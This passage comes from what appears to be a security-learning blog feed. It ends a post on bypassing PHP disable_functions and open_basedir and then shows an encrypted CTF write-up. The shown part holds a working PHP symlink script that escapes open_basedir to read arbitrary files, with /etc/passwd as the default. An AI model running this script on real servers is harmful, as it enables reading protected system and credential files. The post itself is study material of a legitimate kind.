&#39;&#x2F;&#39;, isset($_REQUEST[&#39;file&#39;]) ? $_REQUEST[&#39;file&#39;] : &#39;&#x2F;etc&#x2F;passwd&#39;);</span><br><span class="line">$relat_file &#x3D; getRelativePath(__FILE__, $file);</span><br><span class="line">$paths &#x3D; explode(&#39;&#x2F;&#39;, $file);</span><br><span class="line">$name &#x3D; mt_rand() % 999;</span><br><span class="line">$exp &#x3D; getRandStr();</span><br><span class="line">mkdir($name);</span><br><span class="line">chdir($name);</span><br><span class="line">for($i &#x3D; 1 ; $i &lt; count($paths) - 1 ; $i++)&#123;</span><br><span class="line">    mkdir($paths[$i]);</span><br><span class="line">    chdir($paths[$i]);</span><br><span class="line">&#125;</span><br><span class="line">mkdir($paths[$i]);</span><br><span class="line">for ($i -&#x3D; 1; $i &gt; 0; $i--) &#123; </span><br><span class="line">    chdir(&#39;..&#39;);</span><br><span class="line">&#125;</span><br><span class="line">$paths &#x3D; explode(&#39;&#x2F;&#39;, $relat_file);</span><br><span class="line">$j &#x3D; 0;</span><br><span class="line">for ($i &#x3D; 0; $paths[$i] &#x3D;&#x3D; &#39;..&#39;; $i++) &#123; </span><br><span class="line">    mkdir($name);</span><br><span class="line">    chdir($name);</span><br><span class="line">    $j++;</span><br><span class="line">&#125;</span><br><span class="line">for ($i &#x3D; 0; $i &lt;&#x3D; $j; $i++) &#123; </span><br><span class="line">    chdir(&#39;..&#39;);</span><br><span class="line">&#125;</span><br><span class="line">$tmp &#x3D; array_fill(0, $j + 1, $name);</span><br><span class="line">symlink(implode(&#39;&#x2F;&#39;, $tmp), &#39;tmplink&#39;);</span><br><span class="line">$tmp &#x3D; array_fill(0, $j, &#39;..&#39;);</span><br><span class="line">symlink(&#39;tmplink&#x2F;&#39; . implode(&#39;&#x2F;&#39;, $tmp) . $file, $exp);</span><br><span class="line">unlink(&#39;tmplink&#39;);</span><br><span class="line">mkdir(&#39;tmplink&#39;);</span><br><span class="line">delfile($name);</span><br><span class="line">$exp &#x3D; dirname($_SERVER[&#39;SCRIPT_NAME&#39;]) . &quot;&#x2F;&#123;$exp&#125;&quot;;</span><br><span class="line">$exp &#x3D; &quot;http:&#x2F;&#x2F;&#123;$_SERVER[&#39;SERVER_NAME&#39;]&#125;&#123;$exp&#125;&quot;;</span><br><span class="line">echo &quot;\n-----------------content---------------\n\n&quot;;</span><br><span class="line">echo file_get_contents($exp);</span><br><span class="line">delfile(&#39;tmplink&#39;);</span><br><span class="line"></span><br><span class="line">function getRelativePath($from, $to) &#123;</span><br><span class="line">  &#x2F;&#x2F; some compatibility fixes for Windows paths</span><br><span class="line">  $from &#x3D; rtrim($from, &#39;\&#x2F;&#39;) . &#39;&#x2F;&#39;;</span><br><span class="line">  $from &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, $from);</span><br><span class="line">  $to   &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, $to);</span><br><span class="line"></span><br><span class="line">  $from   &#x3D; explode(&#39;&#x2F;&#39;, $from);</span><br><span class="line">  $to     &#x3D; explode(&#39;&#x2F;&#39;, $to);</span><br><span class="line">  $relPath  &#x3D; $to;</span><br><span class="line"></span><br><span class="line">  foreach($from as $depth &#x3D;&gt; $dir) &#123;</span><br><span class="line">    &#x2F;&#x2F; find first non-matching dir</span><br><span class="line">    if($dir &#x3D;&#x3D;&#x3D; $to[$depth]) &#123;</span><br><span class="line">      &#x2F;&#x2F; ignore this directory</span><br><span class="line">      array_shift($relPath);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      &#x2F;&#x2F; get number of remaining dirs to $from</span><br><span class="line">      $remaining &#x3D; count($from) - $depth;</span><br><span class="line">      if($remaining &gt; 1) &#123;</span><br><span class="line">        &#x2F;&#x2F; add traversals up to first matching dir</span><br><span class="line">        $padLength &#x3D; (count($relPath) + $remaining - 1) * -1;</span><br><span class="line">        $relPath &#x3D; array_pad($relPath, $padLength, &#39;..&#39;);</span><br><span class="line">        break;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        $relPath[0] &#x3D; &#39;.&#x2F;&#39; . $relPath[0];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return implode(&#39;&#x2F;&#39;, $relPath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function delfile($deldir)&#123;</span><br><span class="line">    if (@is_file($deldir)) &#123;</span><br><span class="line">        @chmod($deldir,0777);</span><br><span class="line">        return @unlink($deldir);</span><br><span class="line">    &#125;else if(@is_dir($deldir))&#123;</span><br><span class="line">        if(($mydir &#x3D; @opendir($deldir)) &#x3D;&#x3D; NULL) return false;</span><br><span class="line">        while(false !&#x3D;&#x3D; ($file &#x3D; @readdir($mydir)))</span><br><span class="line">        &#123;</span><br><span class="line">            $name &#x3D; File_Str($deldir.&#39;&#x2F;&#39;.$file);</span><br><span class="line">            if(($file!&#x3D;&#39;.&#39;) &amp;&amp; ($file!&#x3D;&#39;..&#39;))&#123;delfile($name);&#125;</span><br><span class="line">        &#125; </span><br><span class="line">        @closedir($mydir);</span><br><span class="line">        @chmod($deldir,0777);</span><br><span class="line">        return @rmdir($deldir) ? true : false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function File_Str($string)</span><br><span class="line">&#123;</span><br><span class="line">    return str_replace(&#39;&#x2F;&#x2F;&#39;,&#39;&#x2F;&#39;,str_replace(&#39;\\&#39;,&#39;&#x2F;&#39;,$string));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getRandStr($length &#x3D; 6) &#123;</span><br><span class="line">    $chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;</span><br><span class="line">    $randStr &#x3D; &#39;&#39;;</span><br><span class="line">    for ($i &#x3D; 0; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $randStr .&#x3D; substr($chars, mt_rand(0, strlen($chars) - 1), 1);</span><br><span class="line">    &#125;</span><br><span class="line">    return $randStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/21/Bypass-disabled-functions-open-basedir%E5%AD%A6%E4%B9%A0/11.png" alt></p><p>更多bypass方法参考：<a href="https://www.mi1k7ea.com/2019/07/20/浅谈几种Bypass-open-basedir的方法/#网上的一个脚本" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/#%E7%BD%91%E4%B8%8A%E7%9A%84%E4%B8%80%E4%B8%AA%E8%84%9A%E6%9C%AC</a></p><p>参考资料：</p><blockquote><p><a href="https://xz.aliyun.com/t/4688#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/4688#toc-8</a></p><p><a href="https://www.anquanke.com/post/id/197745#h3-8" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197745#h3-8</a></p><p><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192052.html</a></p><p><a href="https://glotozz.github.io/2020/02/26/从一道题学习bypass-disable-func/#一-dl-拓展库绕过" target="_blank" rel="noopener">https://glotozz.github.io/2020/02/26/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0bypass-disable-func/#%E4%B8%80-dl-%E6%8B%93%E5%B1%95%E5%BA%93%E7%BB%95%E8%BF%87</a></p><p><a href="https://lihuaiqiu.github.io/2019/10/09/Bypass-disabled-functions-open-basedir-php/" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/10/09/Bypass-disabled-functions-open-basedir-php/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> tricks </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> Bypass disabled_functions </tag>
            
            <tag> Bypass open_basedir </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF-2nd解题记录</title>
      <link href="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="1b655c4e628c87e6b96aa9af021b4d644b73020c064e783bccb3402815368a32">f45f502a466887663450296df1eceb2ab2802d6bc0902168660e7fb616608d79b9b084b4389e52ade0658a44a3182dd0e1b0040371560cfdb1f598156c82563d8d61d9b7b3bcbb561df41594aca433494d325bca9135912c39a727dddc76fc6c6e9f8495faf695fd2cac43e6c3191a3b0088253afe9e0290bdf2daf616e85696b9d63f046849b05c3028d53322eebf6242eef279353957d49e9e6afe7e4904aa73d0b2dfb59b6f284c23fc5ba2f4b54dc9d1fd81f5a6be4a888a58e5becdb6d394ebd59b21adf18bb45ad9ba9e13c9b40584e8557dfea3cb5bd5eafe65df2d91b49e69b9a039e227d601f64fb3569358a613ea32edd4fe4b62439e348ecf6365fc3da7c767b888a0ba35e2db86080b20c5fdf6785d6b9214dc83061f83d4130526c22d36fd63397e74c1162e1fe7365409c499353c5911804b2b04faf12bc599163206975d72dba31b720f227fbc13334667d4c1757baf42cc37efc4bcad603c8c25cda9a3a1c94964831a6461fc5a4c0c4adc340dc055c428b2658f2fc5775b9fdbf68e83baa5ca5e5342ceb210ec573ce60a5940800429397ba56adf4ae84012fa6da894cfffc2d65229ce4ee7ef903d7fd4092f8448c6e267924de9e3f004241e1bfa9b2f02c1f4e67264870ef8686c34617807492c47ef336ba1420e1801543fb73cde2991fd45af7a2de2ed577df1f674fab62b7b089f10a834d62a4ba8e5d14aa332d6e7dccf4af24b9c41cc523ed559daa675c2e703612804f707323ec4c990cf847ce44100ee411729508374126aedbcd1da87b48f3f9019c363615bd7fe4ccff71f74d879a667aaca1623af46591d30ae2bac0f9fe8d9fcfb8da2ffaaba62ebff6453b7c10ef0a5b9e864a759949a53723abda974886bbf26d31a8337472289f759ced2dda5a448088656dfe877969fa6e6b1c99ac3069f2b6cf50cb1d8d9b84d782ac9a57d9bc5ddb4646f06542c689247799ef9801e0e3b2b0e45a549eca6aed1f9f8b83b82aeb9154fb1a86803378f38fc6e47fcd22140cafb1d50c6f0025dab7e36eafd66741f5f2937d42ec38e70ab8e0840a352683061ee7b335efc00f03a2d66ead477ba248ce29849cd299629171838738ec26a90e24c36a0873efd93aaa6d43b75509f4423e1c1424391d289d66adae665766f943c448916047f9b11aa4b870b9dbf2720deddcc5d2c8a6823b75b925f1f87e3da1901b673fd18faa82b4c97140fdeb28f5bd3005d16bd683581e91652c7584d2b3d6396c90c5d3504236072da273452e9783eddd48265a162187b318ebc850eb6a8fb21f7e07adf664b3389978614719dedcbbf4923a6402c72ea5359bf691cb56a3b6552893d4eb4533311a3f9c04816d7ce607e6e4879878bd7d4cc7c0d7aab40c88badc8f54bc8073f16ecdac38c894a32ce082a9e73a1fecaa8252220a9034378fde61c322286794ab1225a332860ae0517266c81c8c12c5f6a73d8d88db574ce031e4bf89eaeb08b1e17b02cf61b958566662d947cdca1d91e5f4164ac94814653811f894984c25b941962feddca50ed109ac020732124030ac0068cbf59eca98b84479e39a08193fcb318e9bb9e98f5a83ce6e2dacd86665f123f175bf1d6fb35a5d1a3a0ab24f61880f9444a72c55e5255050b58c2d24c12dce139d6a65fdf495bee7feaa8058c4b538c9a75775cef530109389644b8278a4cb92427f21ca098e72607bb890eeb548d127912cfb1bde58a4a582c5446672f31221ad74247336d1b10d43db67ab8eeeb688a9520de05ac2711c7b128366e2329db9f951bf6b26ed184c092a2795fcbe74a3d8bf1e31c040183c558e9469ce8b3a64100b70a7ca21c84058c8465ee4f5726d076e98bcbe99e386caf338924b07e23d17509323f8387cfe14a4b71ac0af437bd3ca03c25e3cb6db64b93e6bac632f1e52478dbba0c207ced9ca52e7cc2df977773ec4a84a720be876a194d0cd1f34d4964fd574b8657851e46a1405a282773b34888d0ab67ec680bd5e717a80d2303a66cdc23f6b1676b6b1f095b6b1a64787f697d64699cfdeca99e077fff564e1e3824879a9b096caa3671f3f93136b6af2c60c952e3ead1af98ef05627c3121be67f65ae3cce9524c05a6ac475efd6feb039feeaa7ecc70c3379c63a92a04fde996cd718d88ff8d4196d45161060e53b2fc9134f91f28877ee48514c00bc6bf396424d86470e4fcec9fbf2f1291d1203e66384d2645bf31a5e572d9f017541fa8c7ca57524090a14edea2c048fec0575a4e4baaee1e52fdd7667d3159548607a6d7306702d764b99379788847a114afc98f853451a22614187b97fa750f0c7d1b57148a1b75b70f1153dc6eb1cdebd8af706365c2236c8591e89d18527e9f6dcafa5a2db2384d7df76f506c3aa5e60f022ea82302ed25039fc9bde8e404b902ec16ff3fe2a24a1f6b600520ae8743afced3740c18288d87293d2c3ad4b2f2e4e6c58275b4664728ca49fcae29cc4580bf201c29494dbf8fd2eaf68a9212d8fb11cdd7ada24992101834f1b0efc21ac1d6ffec606b8ffb6d0da61108af1bf4eda6e02a88354916b72366e118fb12ff34844b7db182a678a503029a69671d7211ec0cd5cf2b199d93ea4e6d245620b267a30d6e889cc0c098c2c71505a21cc7af1790ca1e04fa207440362240443a35bff10972d4eee8034cea35f7fb93cd6d92640b18d5c963c89f4d05fcf435c6ee8dab1f512de0f350b32895637a64cdf4f9492dc1e1fa1cff6a3e23e9b47974425c80a187a9c0e21b3a3ff7f4eacf51107f4ee45ca0607aa6f21c147df21cd76ebb5141f298d54864ffe46721a0e33fe21089e028127a86b02c498add90ead2592f5bc068440e3e09d7ba3c1543cfba9d846d2d3ed57bb34dea89a0b599497e94fda3d1de1991ae8c9802d3e39628640368c60b3b4e665f29e5833ac784c6e43d97d6f6d8224f526e8de7cc2991d5466162fb100e6fb1814e7b22fe7e8e26c804518f02dd72f646cb12a46ed97382fa6386902b23805d5dece1d5a04479aaf61f3261010e7bb910190ef7addf6cf53bebd5c547826513efdc80e804ee57e4ece797c2ea49a2250dd6fd91c9cf2784aadce2c137317f43bcbdc1e387ba411e697c2b459d0766ace0520997a150c192a9b9134900524cbea7735a70e144a1070627c0d603432ea3bdb41392ef04992d8e402c17a26ff028d8802ee39193d9dd66501159ffb99e93b0053b42d586a36ff26b5304765c349b2fb3edd39f7ab8778d8e99f6d7faae3f030dba9910bdb14c7d4b6623e66a790d50a0365d7c8758f22bdf8dd7233f7900a6823bbc11ccca8b7243ca0a83fbb21e7fc4afa64c29710d5cea299a77e600a115d253992113c0a9565d6d6e5c6b0c5eec05d7d00ba99463b27fe5ca07938ced78d98772d6091654dd5dcca9bfbcfdea5db4fc67124951e6be616e5ceedcefe6ddc8497ed7796ccd77f7805172a09480a3af7aeb5c5e4255c65ac164905f82fcf3ece21fdfbc67e9c6ef79e4b05386861f1626bd6ab2b6a291b072b54b673ff5ff480eeb96327208cfe1ce4690896e0525f673b5047d9e0b22d40ed6b3c0b4fdf64ba3471b3b8efa05ddfed05cd9b95de1038baafdff4e644bb9b09dbe1342054ba3660a1cf1a48872054175004df351909d49bd0b70c1285e900afe255dcd03dd89acdc12b4a07a45dbe1cb3176bf76e5f900d2189c3cea605759df0f9ac05b6f7f6d0335cfe1204371a9206241598f1bbf3f914f3d2d5ed2251c8f41486cf138d27cb729052cb5a4623ad4bf3f68b704df557462b10d5696c245cdc1034a6255f9158d72885d289425226dbb1033bef2bc2d6bdbde92a3c4d55d72587f6cb2f752c4005240152fc92d43a794ff8e3a2446ea79bd5a03d97d522a25f3671ed4344f46916fff762d3111516650927b0b43d0a315efb5d6c4d6867bc4d077bdf4806a0690ddfc90993be9ff5ce3ff3d2e359bc6826cf72c58ce4eccbca86c0369bcb3d1e737708c09252f74a84a85ffdd3735d558308b1afe3f2347f5e73e9fdb1284aa53354149fb6c9993c92556d588b05dc02999f53888c1162057b248238fb0c7ca9ff2481c100d491289c78e6cf01b46f955733078d12e8e4cfd8fc9baece4e8bdf46922ecec03d5bb365e09d683c163bff160fcdd211cfe1ca4cb0344302b70fd865956b6cc5195cc45299e0299ccb10e60bb28e815e64db7f858f117d4f03f8cbdefa1be884f108260c55017523280fdfa0fbb756116a20504e8ae4c17adaa070be02fa1efeda536d437aa77833cf002f05ce4618b5b6ad7fc9cc2ee80c0880adb33c6e6b4dc8555e961628bc86f4b40447c00c5a5c0791d17a9cee6c9b9a6366f32bed24e0a38d77902b6933f3fb8bd24ba2a5f9bfb0475844b009e5966e49440f940c7007ed923cb985cd9fd1fb9389e6d8d9cf92251e0575fe93d6beb7a273e6de4f833f1ad8f46ed057947b69f3b807c302541886566eb7c13c48e57ecd56eca505edf63bdf83e264053b4af4e3a62e7fc9cddac21be54844e892351853bb85698fd3ccd57be3b438bd4810a60cbe13ca26030dec6389690b8bce7c6629fefff0a6bd9e2db6f92dd77198c40e473ebc1b3f4a18ada1eb4c2aa24416b64ec95361cf590aca7b0875202251e0fe960fcd982e66d091252c6ee9ace4b2a0006c545f413b5f1e8115074e95f606d82310e34101e912f7f415ed82060e7a4331f6e4ae50e0049a1bd81be5214c834c5a7438e8b6a78288ba5dd6c32b820bd61a0fbd8677a44563746c9d9069f8e5366ac373f5e6ed73d46552c631dfc40c2b9192e63f12bb876322da2ef62d05adcbb449caa3c09f4e414c5be6310d7b6f9d222f42c0aad1e1502e42c4c3d8b8704ff796778ab7e675e577c5aaca63fd015fae24e487b2ca61ad9de65b26bf493a9b7f835b52b29fa9bda1793ad6a4630ac3d33b05cb98878ed3b54646193b77524cfe5fba4e142d4aa5b3fa9bce9f9f07826e5b0acdb676f7895ca6f9b99a576d41a3910799b0c21fcdb7d8b5ba45b66027aa8e685a67ec78644338a60116fd6ba230304919747d65cec92c997864ef4df467772610727b5def1f48a4f626ffef356765946b30dad683566997baa72bbb174b66f50a8bcb2d37dd9e789c722601f94c0d4f3d3437e6ad17c449f6244a307a20425077588113962d23a8114340e902a3f154701d865c3c85f699caf46df1c8fd2ef84b2d3aa4b27f3146eba1281d83137a963b9f74ef5a000335a70d25f68fc1ef38b1b148b99bf5d3e83459525297b926ed0d236bb6b98991235691847137d09fc84b4fb4b30370959aaa0599224c3b6668db4ad36613e61d5dd8d38cbda6a965d171ecb415178b52919d74eebe2d7ff030e5640cb4601b79d81f62dccdb8d5d79e650a22c39669d3008b74c562cb4274647648389d2f8d6770373137d858c601171e11cd80e199cae346593e444d7991ec2f61952bd05cf73acb823f795b06e55977a3f81fac779df67058b9f4c25869e235f5294907433b709826f554097ab92a731fdb891c686b9e3d7ea55202f1f50da928db85e693bc94de75e460d9bed63f05e76ddd26f202c2eab6961154710a8a8fa93dae8eedac00d8a9243836f9b2640f741ad7303e324095485d9ad901ba3b82fb224a220fe530708b18115721dc54b425da682e9d595cd494e1bd4c9cb9b67a27de647f71d02445b9af1f2957bfc0b8215b5e67290dc5b68d77c04caad8ee875c4617a17fd17512d5f1ef4dc0c964205068a363161c5d066dfd9e5783bcf650e1a12aa29e714cdda2a8e86bc10b1a6d8f5096c35208b0f456e915d70c7942aa8644b2cfb5ca49873610c1c9d576306fe5b1e4697a309211bf98d2807d0d44950a3146a528afafc56b60a4eba145fcefbb1403b01a6833e27a0e5be0bad05765d47ba65cbc2d164b1fd167ac8cfe2b5ff340bb501b743ff5ccdcdafaac2aaf0edf9bde1a71ff41f40d89e1172ae4f0352b13a545160e7e472e433078397d76336f5564f98039649565a39e36f19e7908d422efe8e15d8e51b7117949960a07bf58f8c3ac492f889771f7363ca5542746d944d6f4ca63c79863322a874eba28aa3cccf7258e5dac55d8a96cc28fbb8c38b2633d11deec40044d01a54e05f884163a2ddbf4eceeb3fbde5a52bd5c60daa69dfd290d9b0deaee517b3032f45cbc70f41b29db6c9ef6299289c910a4a6d2f5cc2f21ec6670ce8013c554519e704cec291a548a3dbb819cb6065cc8f664000b961a19b821e54a1e493f0c52b7915b5349a4fbdf250b6aa1f06b685817e65907ca8263cd2501e15f0ec90945d2fec16f3680284bb6bc42fc8589a25b034bc1d4ee81766abcf0938b95500050a3cae683c52b113e4c9cbafdbdcf48d2ced32308ada9d6325d8f0ad91aa1fd3271abd933fd36ee86d1f227f2501e994ecd73b37a4f7a859243bad7176f953cc6de8d2fedc723d1bc5efca6f3e78c8517dac4dca4e2721d62a38e660359ab506cea748cf66867f44583fd5ca9b265e89900714371586e35084d59ff9c9f8bdec1fbe2d3257318b556be17d0472a3c78124333dda00822af6a3ae473717cf32eba7dade1df5b63f33196c926169ec8695a2e852b714e615ca6e0dfa83d7909dfbe27a98a135ac34ed96f2dcc76f86591b07dec8e7b3a3170f892f5abba36664a0e59d211ade24184ee549514eceb34ac30d05b315a7fc8be2055745a7c1fa201791b36d7e0c523a1254290738f925ccac1cba1c0bd8bc82d5d42626b6b8613610001e9ba169e7eb2b47c60b47487861b0c843fab0841f86eaacfe18a98cc2915ee3cc4b691bb3e6da9f173e2192429adbbd73cdb879bae6c42b1abe480da6342ea844bb20b15386db3e050ebf2226655bfd199db7202c413840dd8386aef2324d68ebc11ec37e6cb03675d1fa71bff2fb4c16aa3eb74751e246cc0e17976d4b18bc8833d452fb2586fdc192f5b40089e7820fc714ac3af4b5f3f99340a2622c1785be17ea5c379c35e13aa24a84693a8bea7806d9a4bf02c096624bbf15c78928f563f2efba85598068aa599d7e5fb2a984f18423a7682aae3047db83e5f82da8ede8eca23dd0b0856ea0ef87f192683f512909c7a6a2198288f3e80503b9f83bc7fdd3ea63434046c23610ea60623f2cf62867e8a212a38f67758b65d2171debbc8f9feae543a3c66d960aea1139bde49b8f3cba7226939675e6f4cf8274539848892f9246dfc2a6a91251c98d3f581db6bfee4495aeee4bb2daa4b99a5198771afd8963e1015914f5ce8c18dc09ace1db7282b65cab6eea55b565ac2a36bf3398877b011b9e86175e261b98b1c648980dbc70770f961267050c880ba132ac01efadd3212c0630d789776600c1552e5448439fd436a095647a03599cbd667dd1d3ecb24340af9dd4860a57e16f234dfa95214cf8b34cdc59916b4dcb8de61649b8d301ce67fec9a7ca6f8aeebe5384e899ac9af2597b960ee4a3133c11b232ce34e552013c2222083a3c3628505127fbc09deb44fe25014a074b48c59fb617afd54ac87e45d807489496d4dd766b8c4e22e37f9308dd2fa074e7fd57b47e01a8400d4ddaf408ed570edca79060071f2052a7ec69d8da2f6cace9b0062ee975eb89fb704d1a40c1c3b87138a4fe5c1678063d4ecbcba22e81afc34ad35b4f1626f7be687ac385dddb77ea8bcfc290b2ce6cd809e1cc3a3dd3d9bf8515f19202f4ebb65bd8aaeb12eeb66d29ae63753518fed8001910b3b1c892dbf9ec9092c20966f552257db1fc8ce1ed3c2a35301b397dd5af2bb7ea23ee02e146f5083e71a4fa74e5b6c22e3dd8768f42adf7949b547eed215e918701202b7c39be5dc91d7ade9c63ebbcdd6d294b6f390689f87b1fd1c723c285a4eeac181bf56b6cfc97c4a88d16205523c58fca7c1b73adaad47f472ba41ca612e43dc970d4a329acd03116a67473ee605b629b532f096cd23075ede73eecba4df8d3a425ed38b3e36a20e85c3fc754d74fbfb4668a246c88239b04273239a989aca1414b75482b4d7ebf6a6ddaebf745c526c90eb293b63f779a5ee11aa54d5d44b5e7f8490e9bdae1c2182e16db3c8781a57e7163cf9164e96b046c6596ee8e86bd79324c4d30635f3001641940dbb4961878326c092d90d76206d436ec189792434d2cd9ce898e8abfc86d44e23809f45883c6b190c382a7856634df5e298fa41a3e02468166b346b929698ce850da56cffe4a227a57c6fa0490223deec6eeb89fd9a2a9ad1dad2a6705642717b09892682afe18a256317ef488393d85131e579c30c13fd1a4bfccf4463dd5339a5ab9f56aa12a536a1a7287a318ce1c142253dacb5a22cd2de631b4db391113e19354035e8993df99048012dac9c85afdec18597fa2d1e55186d2fd0ce618e43621532bc5dbd183d2537e061e1cc4289e51c6f751bf28bba7dbb14958296124da8469cc474fdec29d79f92a76ad5c8dbe3199d6fdd0b840db0e4555db75c5e21a6b34e727bb3eb5eee13b79f316f755a387223c9a46b4ae43410e52f53fe4aedb09e932754869601c22cc9dd8041034faf77ed91985972e26bf0ae653abf3b02c94970b2f713426c653e6c023e64e55f60cf6242192875b1c1146cfa4b3e7fef9d444ccfd575547676b61dcf2c4f3e4976ae069fd2590976776e17c3064701e48a0e0a80d30b7faba6bb0d3ad075e5d9861c228f17010e844a1f63f65cdbdfef1f4a2c8437f0158878204666712b0b18bb98964222ff2b137b80c2af316482051ea7df9dcc14cb143ba60ce2d53cb1156d25e6954f7a9ec566e58120c7dfc8c7d7baeb60e78d95d793f3ee65ffa4e7c6fea323d54140816734122ecdfc8b7375b0bb76fabf230529ce0600901239d4ec8e8147c123ddd57b3d13d89b8eada9c8776d5b895dff08882ebbf290ffc02071faca65d774b3c075175715e4ff92d2dfff6cff2b3a84760b6b0bde58e793cf54f61f5cab93b58fe8b198f29e3f664a5aa6e7083a056a358ec53fcaa76b98787999074ed6a8481d26a2520308d7be7612de5045fe79a8c3076a18deeaf34a6f65b1ad1c766995f4e115aa0513ae889a8c1d99cccfae3056cec667af920d8832d895bf415d9346399ff51f63d2240f2c9fdeec5b9ed2591db258910c784ce51de7fb2d7d6d2391fd7d452c228f72419f2cac3c41b597ceb25b3701561f60991dbd26f47c213719f7f57bf1cf03434745fd84cf57afb7420b2e2275d62d7c5f571e12acc27a848ccb1dbaa3f2034fab23b3a4263db651d2e573af0428ebe6c7a9e941554b9779f61ebaad999310c931d27527e6908440b33d604588be9b457aacc94f11cf34c72290d2cc0a3720c9a179e8ad4a8b73c46b90166232945cd9394b93431beb171ef8bb0425f656f0edac3270f86f9d3b26c12d247b184e255173cac076e2d208539f14eb4fc73985a9dca5602a6d3a9e57e619deece5ae91e7cf8e810b598e41d442e971ef3cc948a3ff0b9ebe9bd55ec7825e80ed3ad8ef596adb5348a26e6b1eb8915e6e48bcaafa35a069f595fef5d6e5a9309beb907a1df79379022be7b7032f5119b0b8031712e05ae6387ee950d3589076937cd73f12af232644558aacd120075f62ab9b50b0dcd299451c470e173906ca0cbf70f228d22873cd2f7c788f7e3f3347edad139cd5f5cbf8e31d866cc604003c8769ec4658d126ab10bac1a84f9a9dac5607fe8ee7ad90072f0f20c5d3b0d24455745362e4410e13feae68061aa568552200adc5bc2a1a59ba90838ac7192fd4221b1105f7792dfb825ac08327dab88746793a300b35ae5ff2931a108b00d31559bdb760d28796d88cc6f7f0815312e60da5c5b20e92ca30744813a6f7489ddb91ec0cd9606e2da5f3f56c7d87ecbac2aba131042066f6c30776b8478e3b3ed4ee8f7c8bce6f8609c2ebe9660f87b5f5f17aea54896d9dd57b99562260fe9872cf235c410dc8762602647ff9700add59cacce08d18a7c447687cdab3ce0a568c3e15887ee5b24b2e2472abf697f2a9b1244f2e90c3e2806210c41362cd3ce4f8c21a74313a713807bded8086277b9a796ffd6c56fb3799b1379d5082696ce023ff6f6d9ad7055561f31ec53f2ce34b8660e593f32432dbf7fe247be00f1b0c853f878ca5f183f911bef533cd5ee7de668212fd366a4103711bd1db51c5544b622aefbba9a996d5a8029890e1d3cbc47cca94a96918835b5eb3a5920b70b6d400fa7c84b3eb96e163a05c481f200c0a96b3aeae23dba73af3e6865c80a36bea6d6fe5ce26559aea98e13fe9fe73695741a653605e4569cb19aec355f9232ee14187e54ebe566b5b1c128cbea27463c1b3db5479b16eb5255f57c0296e3ad991e7a9814246769bca3ca272c44d1936010fabd7a03e384d4e3f36cb45a093733a2c2de433acdb096a95f6d6ecb34efe90c3cfb72d052396dd8b3a24bf0bb5fc3c3b68b439ee524ef89a2e1113d69450695f8da4b2e7a6c7ff7a86ab81cd15a467700c49fc2b7bcfc4bde2d45cc01f9fc783d9c95200ba7d6b2e7fea020164df897aff4c875a69da7c6112aa15c3fcff74308c8c98efb3fa78d877e62cca293078420b2ccb0fe20ae489d45f71e7d05aa2c3b2ca520d4d92e100802342e264bf25bb60efbb79021cd0326175ed6d637a24018248e20d13f99045e18b56e996d385c6464eece455db5bb3b0dbbaf925dcf1f55e2937f5589723a5705b2d24722afaea81ca3d41aaf99648623a6415ba5abfb5343e86f26c3db715634aa2bc304d50a5d87eaa35b6ee5f6ea0c773fbacf4badc2e5bf3405b395bdba7b1fec7a3c467558182562f77762c89be573fa789c32f8e2c5b130f17ad0c5886c8d0494caac3c4fd6a394ab1f4b7b4b030615b5000d11fedb91fe21b85b9940eeadff2dd462be9610b08fdb94f2fff77630d3b70d4901485ece50bb7374e827c6d171952c1b1a4c214c702ca93502a97834bae9d5a25ba29ae46e77b9207e4d2f3df636b39a0eca8b0930ae22135bd21f88739a91ae9699e7448ebd26e5b71956d59302a9fabc5b85699b3c98db40f0e8fef15c040d70896185dc456a920c78e57fd08d144b812961957fe570bb71f977ce3ab0ac0b41fb020acdcfc91a10fe31189a6d5864a6b0e04a9f05364c4584e0dbe2033f12173ef965ab9a4e5f075b9d6778c9b1ab2c122a99a6679c757a1e5f62d6b6f31e015de9a10e73b18084a734da99104c59b212f95d5f4309155519368cb917b03acbf878eb4984865e917733c42d3de27770dc6741da51fb374ad1f26fe3958575ce1e4c849f4c420c8edae9dca93dacca2f28931c0487e8bd20025bf49df040181e3c87681fed1bc5a96c0a05692a6da53536872b60b34a24900c3e0ad806d138f28f106d4f2e180eed83b162d23c65c26306f2e2daa6c596b79b380991342a05d9a390923f7fa56c6aded344558e5378bd1e1b6127693b8749728e485203bd9e85b91b31631f76e000b794c2ffb8c4be078b3d95c372674e488a2aab0ee04a458713e13c15baec2829387ae2dce4